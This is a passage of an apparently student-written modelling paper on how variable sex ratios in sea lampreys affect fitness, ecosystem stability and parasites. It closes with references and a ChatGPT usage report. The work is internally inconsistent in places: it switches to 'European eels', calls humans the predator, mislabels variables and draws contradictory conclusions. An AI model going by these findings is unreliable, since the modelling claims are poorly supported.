offspring.</p>\n<p>Possible disadvantages include: Reduced fertility: When the proportion of males is too high, it may lead to a lack of females, thereby reducing reproductive rate and genetic diversity. When the proportion of females is too high, it can lead to excessive consumption of food, which can affect their growth and health. [Note, this is not inconsistent with advantage, but in a different dimension of thinking about the problem] or over-parasitical other species, resulting in resource damage, population increase, overfishing, disruption of ecological balance, affecting population diversity</p>\n<h2 id=\"62-genetic-algorithmjavascript\"><a class=\"anchor\" href=\"#62-genetic-algorithmjavascript\">#</a> <strong>6.2</strong>  [Genetic Algorithm](javascript:)</h2>\n<h3 id=\"621-model-assumptions\"><a class=\"anchor\" href=\"#621-model-assumptions\">#</a> <strong>6.2.1</strong> <strong>Model Assumptions</strong></h3>\n<p>Our genetic algorithm-based model is founded on the premise that adaptive sex ratio variability is a response to environmental pressures. In the case of the marine lamprey, whose sex determination can be influenced by factors such as food availability during larval development, this adaptability may provide a distinct survival advantage. We assume that in environments where food is scarce, a higher proportion of males could reduce intraspecific competition for resources, while in resource-rich settings, a balanced sex ratio could maximize reproductive opportunities. Nonetheless, these adaptations are not without their trade-offs, as a skewed sex ratio could lead to decreased breeding options and heightened vulnerability to environmental stressors.</p>\n<h3 id=\"622-model-establishment\"><a class=\"anchor\" href=\"#622-model-establishment\">#</a> <strong>6.2.2  Model Establishment</strong></h3>\n<p>Our modeling process begins by initializing a population of potential solutions, represented by binary-encoded DNA. The DNA_LENGTH is set to 24, indicating that each individual solution comprises 24 'genes'. The POP_SIZE of 200 specifies that we will simulate 200 potential sex ratio strategies within the lamprey population. CROSSOVER_RATE at 0.8 and MUTATION_RATE at 0.005 are probability thresholds dictating how often genetic mixing and random mutations occur, respectively, throughout our generations of evolution.</p>\n<p>In the context of lamprey populations, we are particularly interested in how the sex ratio—ranging from 0 (all male) to 1 (all female)—and food availability—also scaled from 0 (lowest) to 1 (highest)—affect the overall fitness of the population. Fitness is a measure of how well each strategy copes with environmental conditions and is calculated by the simulate_environment function, which considers the deviation from an expected sex ratio based on food availability.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/o4RsirmxyGXMTIH.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 10 Genetic algorithm design flow chart*</strong></em></p>\n<h3 id=\"623-results-and-analysis\"><a class=\"anchor\" href=\"#623-results-and-analysis\">#</a> <strong>6.2.3</strong>  <strong>Results and Analysis</strong></h3>\n<p><em><strong>*Picture 11~16 Food Availability, Food Chain Status, Adaptability, Overfishing, Reproduction threatened and ambient pressure were taken as the y axis, and sex ratio was taken as the x axis. The calculation is a 3D scatter plot of the z axis*</strong></em></p>\n<p>Our simulations reveal that the marine lamprey's ability to adjust its sex ratio confers several advantages. It allows the population to adapt to varying levels of food availability, improves its position in the food chain by optimizing resource allocation, and exhibits remarkable adaptability to environmental conditions. However, the disadvantages become apparent when reproductive opportunities are threatened, or the population faces environmental pressures such as overfishing, which leads to a decrease in fitness. Thus, while the adaptive sex ratio variability of the lamprey population provides certain ecological benefits, it also poses significant risks, underscoring the delicate balance this species maintains within its ecosystem.</p>\n<h2 id=\"63-conclusion\"><a class=\"anchor\" href=\"#63-conclusion\">#</a> <strong>6.3  Conclusion</strong></h2>\n<p>Lampreys show multiple ecological advantages by dynamically regulating the sex ratio. First, increasing the proportion of males increases their position in the food chain, and males are better at resource access, especially when resources are scarce or threatened by predation, which helps to reduce mortality and improve survival competitiveness in the ecological chain. Secondly, adjusting the sex ratio makes lampreys more adaptable, able to flexibly respond to environmental changes, and improve the success rate of survival and reproduction. In addition, an increased male ratio could help reduce predation threats to lampreys, reducing predation pressure and maintaining a more stable population. Finally, the model showed that environmental stress was significantly reduced when the proportion of males was more than 50%, suggesting that the presence of lampreys helped to reduce ecosystem pressure on them and promote the maintenance of ecological balance.</p>\n<p>But sex-ratio adjustment comes with some potential disadvantages. One of these is that it can lead to reduced reproductive opportunities, when the proportion of males is too high there may not be enough females, reducing reproductive rate and genetic diversity. In addition, if the proportion of females is too high, it can lead to overpredation and resource consumption, negatively affecting the growth and health of lampreys. At the same time, factors such as overfishing and environmental pressure may also cause resource damage, excessive population growth, overfishing and other problems, destroy the ecological balance and affect the diversity of the population. Therefore, while enjoying the multiple advantages brought about by sex ratio adjustment, it is also necessary to carefully deal with some disadvantages that may be triggered in order to maintain the balance and stability of lampreys in their ecosystem.</p>\n<p>However, for lampreys, the ecological advantages shown by dynamically adjusting the sex ratio far outweigh the disadvantages. This ability to adjust allows lampreys to respond flexibly to different environmental conditions, improving their survival and reproductive success. By optimizing their position in the food chain, mitigating the threat of predation, and reducing environmental stress, lampreys are able to better adapt to complex ecological environments and maintain their balance in the ecosystem. Despite some potential disadvantages, such as reduced reproductive opportunities and increased environmental pressures, the benefits of sex ratio regulation can be better realized through careful management and integrated consideration of the complexity of ecosystems. Thus, overall, lampreys' ecological adaptations and advantages, demonstrated through flexible regulation of sex ratios, dominate in maintaining balance and diversity in their ecosystems.</p>\n<h1 id=\"7-effects-of-variable-sex-ratio-of-lamprey-on-ecosystem-stability\"><a class=\"anchor\" href=\"#7-effects-of-variable-sex-ratio-of-lamprey-on-ecosystem-stability\">#</a> <strong>7</strong>  <strong>Effects of variable sex ratio of lamprey on ecosystem stability</strong></h1>\n<p>We use differential equation - Jacobian matrix to find eigenvalues to judge the stability of ecosystem. Select the points whose derivative or partial derivative is equal to zero, and analyze these points to calculate the Jacobian matrix near the stable point, and analyze its eigenvalue. We calculate the Jacobian matrix at two stable points (origin and non-zero stable point) and solve their eigenvalues. These eigenvalues can be used to analyze the stability of the system at these points. The real parts of the eigenvalues tell us how the system behaves around these points: if the real parts of the eigenvalues are all negative, then the system is locally stable at that point; If the real part of at least one eigenvalue is positive, the system is unstable at that point.。</p>\n<h2 id=\"71-not-considering-the-prey-of-lampreys\"><a class=\"anchor\" href=\"#71-not-considering-the-prey-of-lampreys\">#</a> <strong>7.1</strong>  <strong>Not considering the prey of lampreys</strong></h2>\n<p>We use the Rottka-Volterra model differential equation, namely:</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/FnJBo8GOHqWCAXK.png\" alt=\"image.png\" /></p>\n<p>The stability of the ecosystem is understood here as a stable population of lampreys and their natural predators. Initialize Natural_Growth_Rate = 0.5+0.5* (gender_ratio[gen] -0.5), make the probability of predation of lampreys β=0.4* (1-gender_ratio), initialize the number of lampreys and the number of predators, and iteration 200 times. According to the output model of the Jacobi equation, the ecosystem is stable when the male proportion is 55% to 81%, and unstable at the rest of the time.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/SyfGlPHKitk9hwb.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 17 Population dynamics of lampreys and their predators*</strong></em></p>\n<h2 id=\"72-consider-the-prey-of-lampreys\"><a class=\"anchor\" href=\"#72-consider-the-prey-of-lampreys\">#</a> <strong>7.2</strong>  <strong>Consider the prey of lampreys</strong></h2>\n<p>At this point we call the ecosystem differential model:</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/R3Hy1V2OidnmeU8.png\" alt=\"image.png\" /></p>\n<p>Where G is the number of prey, R is the number of prey, and E is the number of predatorsSimilar to 7.1, we added that the predation ability of lampreys increases with the increase of males. Then we performed the Jacobian operation on these three equations, and we were surprised to find that the ecosystem was stable within the range of 50% to 82% males.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/IHDVN6EPCwpBfvA.png\" alt=\"image.png\" /></p>\n<h2 id=\"73-conclusion\"><a class=\"anchor\" href=\"#73-conclusion\">#</a> <strong>7.3  Conclusion</strong></h2>\n<p>Based on the results of the study, the change in the sex ratio of lampreys has a positive effect on maintaining the stability of the ecosystem. Without taking into account parasitism, studies have shown that the ecosystem is relatively stable at a male ratio of 55% to 81%. This suggests that lampreys have the ability to promote a relatively balanced ecosystem within a specific range of male ratios by dynamically adjusting the sex ratio. In the case of lampreys as parasites, the ecosystem remained relatively stable in the 50 to 82 percent range, even with the increased male ratio. This indicates that the regulation of the sex ratio of lampreys can maintain the relative balance of the ecosystem in a wider range, so that the ecosystem shows a certain resilience to the change of sex ratio.</p>\n<p>Combining the two models, we can see that lampreys show positive effects on ecosystem stability by adjusting the sex ratio, providing a regulatory mechanism for ecological balance. This regulation of ecosystem stability may be related to lampreys' ecological roles in resource utilization, predation control and adaptation, contributing to their relative balance in a complex ecological environment. The excess of the interval constructed by the model indicates that even when lampreys are hit by sudden shocks or sudden natural disasters, the sex ratio breaks through the normal interval, they can still maintain their relative stability.</p>\n<h1 id=\"8-effects-of-variable-sex-ratio-in-lampreys-on-other-species\"><a class=\"anchor\" href=\"#8-effects-of-variable-sex-ratio-in-lampreys-on-other-species\">#</a> <strong>8</strong>  <strong>Effects of variable sex ratio in lampreys on other species</strong></h1>\n<h2 id=\"81-system-dynamics\"><a class=\"anchor\" href=\"#81-system-dynamics\">#</a> <strong>8.1</strong>  <strong>System Dynamics</strong></h2>\n<h3 id=\"811-model-assumptions\"><a class=\"anchor\" href=\"#811-model-assumptions\">#</a> <strong>8.1.1 Model Assumptions</strong></h3>\n<p>Our model is predicated on the assumption that the sex ratio of marine lamprey populations, represented as R（T）=F(T)/M(T), can significantly affect ecological dynamics within their habitat. Given the dependence of parasites on their hosts, any fluctuations in the lamprey population—attributable to changes in the sex ratio—could provide an ecological advantage to these parasites. Specifically, we hypothesize that:</p>\n<p>A higher reproduction rate, facilitated by an abundant food supply P(t), will lead to an increase in the lamprey population, subsequently benefiting the parasite population due to increased host availability.</p>\n<p>Parasites might exhibit resilience by maintaining or even increasing their population in the face of fluctuating food supplies, suggesting an advantage in their life cycle and infection strategies that allow survival and propagation when host numbers vary, as expressed by the dynamic <img data-src=\"https://s2.loli.net/2024/07/04/38fOLsUykthHFQu.png\" alt=\"image.png\" /></p>\n</li>\n</ul>\n<p>, where ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps14.jpg)represents the survival rate of parasites.</p>\n<h3 id=\"812-model-creation-process\"><a class=\"anchor\" href=\"#812-model-creation-process\">#</a> <strong>8.1</strong>**.2** <strong>Model</strong> <strong>Creation Process</strong></h3>\n<p>In constructing our model, we employed a systems dynamics approach to articulate the complex interplay between lamprey populations, parasite populations, and the food supply. The core parameters of our model include:</p>\n<p>The lamprey population over time, *<strong>*<em>N(t)*</em>*</strong>, influenced by the birth rate *<strong>*<em>b*</em>*</strong> related to the female lamprey population *<strong>*<em>F(t)*</em>*</strong> and the death rate *<strong>*<em>d*</em>*</strong>, as well as the external food supply *<strong>*<em>P(t)*</em>*</strong>.</p>\n<p>The parasite population over time, <em><strong>*<em>P(t)*</em>*</strong>, which depends on the lamprey population as its host and is subject to the survival rate <em><strong>*<em>s*</em>*</strong> and death rate <em><strong>*<em>d*</em>*</strong></em></em></em>*<em>p*</em>***.</p>\n<p>The food supply, *<strong>*<em>P(t)*</em>*</strong>, which directly impacts the reproduction rate of lampreys, thereby influencing the availability of hosts for parasites.</p>\n<p>The model is expressed through differential equations that delineate the growth or decline of both the lamprey and parasite populations, incorporating the variables of birth *<strong>*<em>b*</em>*</strong>, death *<strong>*<em>d*</em>*</strong>, and survival *<strong>*<em>s*</em>*</strong> rates<img data-src=\"https://s2.loli.net/2024/07/04/wpJXdxRlCK9gfQS.png\" alt=\"image.png\" /></p>\n<p>These equations represent the core of our dynamic model, capturing the interdependencies and feedback loops within the ecosystem influenced by the sex ratio of the lamprey population.</p>\n<h3 id=\"813-results-and-analysis\"><a class=\"anchor\" href=\"#813-results-and-analysis\">#</a> <strong>8.1.3 Results and Analysis</strong></h3>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/4mG9YzIo8NTr5t6.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 19~20 Population changes of LamPrey and Parasite under High Food Supply(19) and Low Food Supply(20)*</strong></em></p>\n<p>Figure 19 and  Figure 20 show that :</p>\n<p>Under high food availability, both lamprey populations and parasite populations show an increasing trend . This may be due to the fact that high food availability increases the reproduction rate of lamprey, which in turn provides more hosts for the parasites. Under low food availability, the growth rate of the lamprey population was slower, but the parasite population was still able to grow. Despite the slowdown in lamprey growth, this did not appear to prevent the expansion of the parasite population. These observations suggest that parasitoids show some advantage in this model in that they are able to maintain and even grow populations in spite of changes in lamprey populations. This advantage may stem from their life cycle and infection strategy that allows them to survive and reproduce when host populations fluctuate.</p>\n<p>In conclusion, the model suggests that parasites can leverage variations in the sex ratio of the lamprey population to their advantage, as they are able to grow under various food supply conditions. The ability of parasites to thrive even when food supplies are low, potentially due to a higher number of females during times of resource abundance, points to a significant ecological advantage.</p>\n<h2 id=\"82-ecological-interaction-model\"><a class=\"anchor\" href=\"#82-ecological-interaction-model\">#</a> <strong>8.2</strong>  <strong>Ecological Interaction Model</strong></h2>\n<h3 id=\"821-model-assumptions\"><a class=\"anchor\" href=\"#821-model-assumptions\">#</a> <strong>8.2.1 Model Assumptions</strong></h3>\n<p>In our Ecological Interaction Model, we begin by hypothesizing that variations in the sex ratio of the marine lamprey population can significantly affect reproductive success rates and survival strategies. This, in turn, may have cascading effects on the growth patterns of associated parasitic populations. \tWe postulate that:</p>\n<p>The sex ratio can shift dynamically in response to environmental pressures.</p>\n<p>These shifts can lead to differentiated reproductive roles and success rates between genders.</p>\n<p>Parasites will respond indirectly to these changes due to their dependence on the host population's structure and density.</p>\n<p>For the lamprey population dynamics:</p>\n<p>![of the lamprey population size and the sex ratio <strong>R</strong>.</p>\n<h3 id=\"822-model-establishment\"><a class=\"anchor\" href=\"#822-model-establishment\">#</a> <strong>8.2.2  Model Establishment</strong></h3>\n<p>The creation of our model involved several steps:</p>\n<p>We defined the intrinsic growth rates for lampreys and their parasites, denoted by 'r_lamprey' and 'r_parasite', respectively.</p>\n<p>A carrying capacity 'K_lamprey(R)' was established, which adjusts based on the sex ratio 'R', indicating the population's maximum sustainable size under varying sex ratios.</p>\n<p>We formulated the interaction terms, particularly 'sigma_lamprey', which represents the rate at which parasites affect lampreys, and 'K_parasite(N_lamprey, R)', the modified carrying capacity for parasites influenced by lamprey numbers and sex ratio.</p>\n<p>Differential equations were developed to model the dynamics of both populations, allowing for the simulation of long-term ecological interactions.</p>\n<h3 id=\"823-results-and-analysishttpss2lolinet20240704onnwjqlb7ibsp1vpng\"><a class=\"anchor\" href=\"#823-results-and-analysishttpss2lolinet20240704onnwjqlb7ibsp1vpng\">#</a> <strong>8.2.3  Results and analysis</strong>](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDI0LzA3LzA0L29ObldKcWxCN2lic1Axdi5wbmc=\">https://s2.loli.net/2024/07/04/oNnWJqlB7ibsP1v.png</span>)</h3>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/LisHxdGoZm6jOAY.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 21 Dynamics of Lamprey and Parasite Populations*</strong></em></p>\n<p>The variable sex ratio of lamprey populations do offer an advantage to other species in the ecosystem, such as parasites. This advantage is reflected in several key aspects:</p>\n<p>l Sex ratio changes and population stability:</p>\n<p>The graph shows that although the lamprey population declined rapidly initially, it stabilised over time. This stabilisation may be a direct effect of the sex ratio change on the ecosystem, providing a stable host population for the parasites, allowing their population to expand and remain stable. Stable host populations provide a continuous resource for the parasites, allowing them to not only survive, but to reproduce.</p>\n<p>l The ability to adapt to the environment:</p>\n<p>Changes in sex ratios may lead to increased adaptability of lamprey populations to different environmental conditions. For example, during periods of food scarcity, an increase in the proportion of males may help to reduce competition for limited resources, which provides a more stable environment for the parasite as the host population does not collapse due to food shortages.</p>\n<p>l Ecological niche occupancy:</p>\n<p>Changes in sex ratios may mean that male and female lampreys have different roles in the ecosystem. This may lead to changes in ecological niches that provide new or underutilised resources for the parasites, thus increasing their chances of survival and reproduction.</p>\n<p>l Long-term symbiotic relationships:</p>\n<p>The steady growth of parasite populations in the charts suggests that, despite the limited number of hosts, the parasites have adapted to the conditions and have developed a long-term symbiotic relationship with their hosts. This relationship may be caused by changes in sex ratio, as such changes help to limit the growth of parasite populations and prevent them from causing excessive damage to their hosts.</p>\n<h2 id=\"83-conclusion\"><a class=\"anchor\" href=\"#83-conclusion\">#</a> <strong>8.3  Conclusion</strong></h2>\n<p>In conclusion, our two models demonstrate that variable sex ratio of lamyprey offer significant ecological advantages its parasitic counterparts.</p>\n<p>These changes in sex ratio not only promote population stability but also enhance adaptability to environmental variations, offering a consistent resource base and food supply for parasites. They are able to grow under various food supply conditions and when food supplies are low, potentially due to a higher number of females during times of resource abundance.</p>\n<p>Additionally, the alterations in sex ratio lead to ecological niche differentiation, thus providing new opportunities for parasitic population expansion. The establishment of long-term symbiotic relationships also suggests that prudent adjustments in sex ratio can maintain a balance between hosts and parasites, which is essential for the health and diversity of the entire ecosystem.</p>\n<h1 id=\"9-sensitivity-analysis\"><a class=\"anchor\" href=\"#9-sensitivity-analysis\">#</a> <strong>9  Sensitivity</strong> <strong>Analysis</strong></h1>\n<h2 id=\"91-ahp-sensitivity-analysis\"><a class=\"anchor\" href=\"#91-ahp-sensitivity-analysis\">#</a> <strong>9.1  AHP</strong> <strong>sensitivity analysis</strong></h2>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/MrymS8e5O2nilbZ.png\" alt=\"image.png\" /></p>\n<h2 id=\"92-lotka-volterra-sensitivity-analysis\"><a class=\"anchor\" href=\"#92-lotka-volterra-sensitivity-analysis\">#</a> <strong>9.2</strong> <strong>Lotka-Volterra</strong> <strong>sensitivity analysis</strong></h2>\n<p>The sensitivity analysis of model parameters is a critical step in understanding the dynamics of ecological system models. In our Lotka-Volterra model, we conducted a sensitivity analysis on the predation rate (r) and the predation efficiency (beta). These parameters directly affect the interactions between prey and predator populations over time.</p>\n<p>The sensitivity analysis results indicate that the prey population (lampreys) is highly sensitive to changes in the predation rate (r) and predation efficiency (beta). As r and beta increase, there is a significant decrease in the prey population. This sensitivity suggests that even slight variations in predation pressure can significantly impact prey numbers.</p>\n<p>Conversely, the predator population (humans) showed a contrasting trend under certain parameter combinations. With higher rates of r and beta, predator populations initially surge but then stabilize. This may indicate that predators can adapt to changes in food supply by increasing predation activities.</p>\n<p>The sensitivity analysis allows us to conclude that in the Lotka-Volterra model, the impact of the predation rate (r) and predation efficiency (beta) on prey populations is pronounced. The prey population exhibits high sensitivity to these changes, whereas the predator population displays greater adaptability. These findings emphasize the importance of considering these key parameter variations when devising strategies for ecosystem management and conservation.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/gJMQ1NOWbmfdjFZ.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 22*</strong></em> <em><strong>*Sensitivity analysis plots for predation rate (r) and predation efficiency (β) for the LV equation*</strong></em></p>\n<h2 id=\"93-comprehensive-assessment-sensitivity-analysis\"><a class=\"anchor\" href=\"#93-comprehensive-assessment-sensitivity-analysis\">#</a> <strong>9.3</strong>  <strong>C****omprehensive assessment</strong> <strong>sensitivity analysis</strong></h2>\n<p>We obtained the gender through records_ The line chart of the ratio overall score shows that within the achievable male proportion range, the overall score remains relatively stable. After deducing the third question, the models of the second and third questions are mutually confirmed, and the model is established.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/weEfzsVSI7lFM6h.png\" alt=\"image.png\" /></p>\n<p><strong>Picture 23 Line graph of total IMRT score as a function of gender ratio</strong></p>\n<h2 id=\"94-sensitivity-analysis-of-genetic-algorithm\"><a class=\"anchor\" href=\"#94-sensitivity-analysis-of-genetic-algorithm\">#</a> <strong>9.4</strong>  <strong>Sensitivity analysis of genetic algorithm</strong></h2>\n<p>This sensitivity analysis evaluates how changes in sex ratio and food availability affect the fitness of a simulated lamprey population within a genetic algorithm framework. The analysis aims to determine the model's sensitivity to these two parameters by observing the variations in fitness outcomes.</p>\n<p>The genetic algorithm's population was initialized with a range of sex ratios from 0 (all male) to 1 (all female) and food availability from 0 (lowest) to 1 (highest). For each combination of sex ratio and food availability, the model calculated the corresponding fitness, which represents the population's viability under those conditions.</p>\n<p>The resulting surface plot demonstrates that fitness is highly sensitive to changes in sex ratio when food availability is low. In contrast, the model shows less sensitivity to variations in food availability when the sex ratio is near the extremes (0 or 1). The steepest gradient occurs when transitioning from a male-dominant population to a balanced or female-dominant one, particularly in environments with limited food resources.</p>\n<p>The model displays significant sensitivity to sex ratio changes, particularly in scenarios of low food availability, suggesting that the sex ratio is a critical factor in the population's adaptability. Conversely, the population's fitness is less sensitive to food availability, especially when the sex ratio is balanced. These findings highlight the importance of sex ratio management in conservation and resource allocation strategies for the lamprey species.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/Wu5bPqjHnfsRJKz.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 24 Sensitivity analysis of sex ratio and food availability*</strong></em></p>\n<h2 id=\"95-sensitivity-testing-of-eigenvalue-models-using-differential-equations\"><a class=\"anchor\" href=\"#95-sensitivity-testing-of-eigenvalue-models-using-differential-equations\">#</a> <strong>9.5</strong> <strong>Sensitivity testing of eigenvalue models using differential equations</strong></h2>\n<p>When we adjust the sex ratio and parameters, within the allowable error range (5%), the stability of the ecosystem output of the code is not affected, and the model is valid.</p>\n<h2 id=\"96-sensitivity-analysis-of-system-dynamics\"><a class=\"anchor\" href=\"#96-sensitivity-analysis-of-system-dynamics\">#</a> <strong>9.6</strong>  <strong>Sensitivity analysis of system dynamics</strong></h2>\n<p>This report examines the sensitivity of the total population size to variations in birth and death rates within a population model. By altering these parameters, the trends in population changes over time are observed.</p>\n<p>The findings indicate that the population size is significantly sensitive to changes in both the birth and death rates. An increase in the birth rate leads to an upward trend in population size, while an increase in the death rate results in a downward trend. Within the parameter range analyzed in this study, the effect of the birth rate appears to be more pronounced, suggesting that it is a critical control parameter for population growth. On the other hand, an increase in the death rate decreases the population size, but the population can still sustain growth when the birth rate is sufficiently high.</p>\n<p>In conclusion, the birth and death rates are sensitive parameters in the population model, exerting direct and significant influences on the population size. Therefore, changes in these parameters should be closely monitored in population management and conservation efforts.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/FmJPS6LZ2OQxlo3.png\" alt=\"inmage\" /></p>\n<p><em><strong>*Picture 25 Sensitivity analysis of birth and death rates by system dynamics*</strong></em></p>\n<h2 id=\"97-sensitivity-analysis-of-ecological-interactions-model\"><a class=\"anchor\" href=\"#97-sensitivity-analysis-of-ecological-interactions-model\">#</a> <strong>9.7</strong> <strong>Sensitivity analysis of ecological interactions model</strong></h2>\n<p>This report presents the findings from a sensitivity analysis conducted on a population model concerning birth and death rates. Our objective was to determine how variations in these parameters influence the overall population growth over time.</p>\n<p>The sensitivity analysis was performed by systematically varying the birth rate between 0.01 to 0.1 and the death rate between 0.005 to 0.02. A total of 40 simulations were run, combining different levels of birth and death rates to observe their effects on the population dynamics.</p>\n<p>The model's output indicates a direct correlation between the birth rate and population size, with higher birth rates resulting in greater population growth. Conversely, increased death rates dampen this growth, as expected. However, the population's sensitivity to changes in the death rate is less pronounced when compared to the birth rate.</p>\n<p>The model demonstrates a high sensitivity to changes in the birth rate, with even slight increases leading to significant rises in population size. In contrast, the death rate's impact is noticeable but less influential. Therefore, we conclude that the population model is more sensitive to variations in birth rate than to changes in death rate.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/eoO1A2baGQBJkW4.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 26 Ecosystem interaction modeling for sensitivity analysis of birth and death rates*</strong></em></p>\n<h1 id=\"10-model-evaluation-and-further-discussion\"><a class=\"anchor\" href=\"#10-model-evaluation-and-further-discussion\">#</a> <strong>10</strong>  <strong>Model Evaluation and Further Discussion</strong></h1>\n<h2 id=\"101-question-one\"><a class=\"anchor\" href=\"#101-question-one\">#</a> <strong>10.1</strong>  <strong>Question One</strong></h2>\n<p>The Analytic Hierarchy Process (AHP) offers a comprehensive analysis of multiple factors, facilitating weight calculation and intuitive insights. However, it is subjective and may not always yield precise conclusions. On the other hand, the Lotka-Volterra model allows dynamic simulation, ecosystem interactions, and adaptive analysis, albeit with the drawback of simplification and parameter uncertainty. In essence, these two models can complement each other. AHP can provide weights and relationships for broader ecosystem impacts, while the Lotka-Volterra model delves deeper into species interactions. Future development should focus on constructing a more realistic and comprehensive ecosystem model by leveraging the strengths of both.</p>\n<h2 id=\"102-question-two\"><a class=\"anchor\" href=\"#102-question-two\">#</a> <strong>10.2</strong>  <strong>Question Two</strong></h2>\n<p>The advantage of the Comprehensive Evaluation Method lies in its ability to conduct a thorough analysis, set reasonable weights, and offer multiple perspectives. While it visually displays relationships through heatmaps, it suffers from subjective parameter setting and complexity. Genetic algorithms, with their adaptability and global search capabilities, are well-suited for complex ecosystem problems. In summary, both models have distinct advantages, and combining them allows for a more holistic understanding of the European eel's impact on the ecosystem. Future research can enhance model reliability and practicality through optimization, improved data quality, and enhanced field observations.</p>\n<h2 id=\"103-question-three\"><a class=\"anchor\" href=\"#103-question-three\">#</a> <strong>10.3</strong>  <strong>Question Three</strong></h2>\n<p>The Ecosystem Stability Model exhibits several merits: it is built on a mathematical framework employing differential equations and Jacobian matrices, providing a scientific and systematic analysis tool. The model compares two scenarios, considering and not considering parasitism, forming a foundation for a more comprehensive understanding. By applying the model to real cases, such as changes in the gender ratio of European eels, it enhances the credibility of practical applications and offers valuable quantitative results to decision-makers. Nevertheless, the model relies on simplified assumptions and may not fully capture all factors impacting real ecosystems. Future efforts could refine algorithms and the model itself for increased precision.</p>\n<h2 id=\"104-question-four\"><a class=\"anchor\" href=\"#104-question-four\">#</a> <strong>10.4</strong>  <strong>Question Four</strong></h2>\n<p>The System Dynamics model, based on system dynamics, comprehensively addresses the complex interactions between European eel populations, parasite populations, and food supply. Core parameters and equations are well-defined, and ecological interactions are explicitly considered. However, both models simplify other factors, such as interactions with other species. These two models complement each other, suggesting the potential for an integrated ecosystem dynamic model in the future to better understand the impact of gender ratio changes on the entire ecosystem.</p>\n<h1 id=\"11-reference\"><a class=\"anchor\" href=\"#11-reference\">#</a> <strong>11</strong> <strong>R****eference</strong></h1>\n<p>[1] William D. Swink. Host Selection and Lethality of Attacks by Sea Lampreys (Petromyzon marinus) in Laboratory Studies (2003). Journal of Great Lakes Research, 29, 307-31</p>\n<p>[2] RYAPOLLOVA N I, PARSHUTA V V, MINTAS A R. Fish industry lamprey larvae breeding-keeping. SU1565441-A. BALTIISK FISH ECON. 2023-08-10. DIIDW:1991034673.</p>\n<p>[3] DAVIS W A. Sea lamprey population control method. US4934318-A; CA2007417-A; CA2007417-C. DAVIS W A. 2023-08-10. DIIDW:1990208774.</p>\n<p>[4] MAURINSH O K, EGGERTS B V. Lamprey fry rearing method. SU1355200-A. TSARNIKAVA KOLKHOZ. 2023-08-10. DIIDW:1988167501.</p>\n<p>[5] WU F, XU A, ZHANG T. Performing artificial breeding of wild Siberian lamprey, by selecting matured northeast lamprey as parent, performing artificial insemination, washing and incubating fertilized egg, separating hatched eggs, and feeding hatched ones. CN104137799-A; CN104137799-B. UNIV SUN YAT-SEN. 2023-08-10. DIIDW:201505012A.</p>\n<p>[6] ZHANG J, CHEN D, MO W, CUI J, SUN S, WANG G. Method for farming river lamprey, involves feeding eel, Penaeus white shrimp and carp into pond followed by feeding and daily management including aeration, disinfection, microbial agent application, water exchange and disease control. CN103416337-A; CN103416337-B. NINGBO CHUANGHUI VEGETABLES ENG &amp; TECHNO; NINGBO DAQIAO ZOOLOGY AGRIC CO LTD; CIXI VEGETABLE DEV CO LTD. 2014-01-03. DIIDW:2014C16110.</p>\n<p>[7] OpenAI.(2023)Chatgpt3.5 <span class=\"exturl\" data-url=\"aHR0cDovL29wZW5haS5jb20vY2hhdGdwdA==\">http://openai.com/chatgpt</span></p>\n<p><em><strong>*Artificial Intelligence Usage Report*</strong></em></p>\n<p>Question 1: &quot;Please explain the Analytic Hierarchy Process (AHP) and its application in assessing the impact of gender ratio changes in ecosystems.&quot;</p>\n<p>Output: &quot;Analytic Hierarchy Process (AHP) is a decision analysis tool that decomposes complex problems into several factors and sub factors by establishing a hierarchical structure, and then evaluates the importance of each factor through pairwise comparison and weight allocation. In the study of gender ratio changes in ecosystems, AHP can help quantify different factors (such as resource utilization, species diversity, etc.)&quot; The importance of impacts on ecosystems in order to optimize decision-making processes. “</p>\n<p>Question 2: &quot;Please provide a simplified genetic algorithm example for optimizing the simulation of adjusting the sex ratio of lampreys.&quot;</p>\n<p>Output: &quot;Genetic algorithm is a search heuristic algorithm used to solve optimization and search problems, imitating the process of natural selection. Simplified examples include defining a fitness function to evaluate the reproductive growth advantage of the lamprey population, and then generating a new generation of population through selection, crossover, and mutation operations, iterating continuously to find the optimal gender ratio configuration.&quot;</p>\n<p>Question 3: &quot;How to use system dynamics models to simulate ecological interactions between lampreys and other species?&quot;</p>\n<p>Output: &quot;The system dynamics model simulates system behavior by constructing causal diagrams and differential equations between variables. In the simulation of interactions between lampreys and other species, variables including lampreys population size, gender ratio, resource quantity, and other species population size can be defined, and their changes over time can be described through a system of equations to study the impact of gender ratio changes on other members of the ecosystem.&quot;</p>\n<p>Question 4: &quot;Explain the application of difference equations and Jacobian matrices in evaluating ecosystem stability.&quot;</p>\n<p>Output: Differential equations are used to describe the process of variable discrete changes over time, while Jacobian matrices are a mathematical tool used to analyze the local stability of nonlinear systems. In ecosystem stability assessment, differential equations can be constructed to simulate the dynamic changes of populations in the ecosystem. Jacobian matrices can be used to analyze the impact of gender ratio changes on system stability, identify the equilibrium state of the system, and its sensitivity to disturbances Sex. “</p>\n<p>Question 5: &quot;What are the advantages of using the NetLogo model to simulate the ecological impact of gender ratio changes in lampreys?&quot;</p>\n<p>Output: &quot;NetLogo is a multi-agent simulation software that can simulate interactions between individuals in complex systems. The advantage of using NetLogo to simulate changes in the sex ratio of lampreys is that it can intuitively demonstrate how individual behavior accumulates and affects the dynamics of the 